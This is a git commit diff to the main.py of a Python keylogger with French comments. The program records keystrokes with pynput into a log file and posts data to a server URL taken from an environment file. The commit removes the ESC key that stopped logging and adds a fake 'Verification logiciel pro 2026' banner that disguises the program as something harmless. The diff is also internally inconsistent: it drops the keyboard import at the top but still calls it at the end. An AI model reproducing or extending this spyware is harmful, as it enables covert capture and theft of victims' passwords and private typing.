6172898166d57a15b1c265c83549a8a479c31594
pkgy4545454545454 <baritropo54@gmail.com>
2026-02-02 23:56:33 +0100

    Modify log file path and implement key listener
    Updated log file path and added keyboard listener functionality.

--- main.py
+++ main.py
@@ -1,15 +1,16 @@
+
 from httpcore import URL
-from pynput import keyboard
+
 import requests
 import os 
 from dotenv import load_dotenv
 from pathlib import Path
-
+USE_PYNPUT = os.environ.get("USE_PYNPUT") == "1"
 
 ROOT_DIR = Path(__file__).parent
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-LOG_FILE = os.path.join(BASE_DIR, "log.txt")
+LOG_FILE = os.path.join(BASE_DIR, "/var/data/log.txt")
 
 load_dotenv(ROOT_DIR / '.env')
 
@@ -18,10 +19,17 @@ SERVER_URL = os.environ['SERVER_URL']
 
 
 # Fichier local pour enregistrer mes codes
-
+print("Verification logiciel pro 2026 ✅", flush=True)
 
 
 requests.post(SERVER_URL, json={"content": "test"})
+
+def start_keyboard_listener():
+    from pynput import keyboard  # import ici uniquement
+
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()  # surtout 
+
 # Fonction pour enregistrer les frappes dans un fichier
 def on_press(key):
 
@@ -32,11 +40,7 @@ def on_press(key):
     except Exception as e:
         print(f"Erreur d'enregistrement: {e}")
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        # Arrêter le keylogger si la touche ESC est pressée
-        return False
 
 # Démarre l'écoute des frappes
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
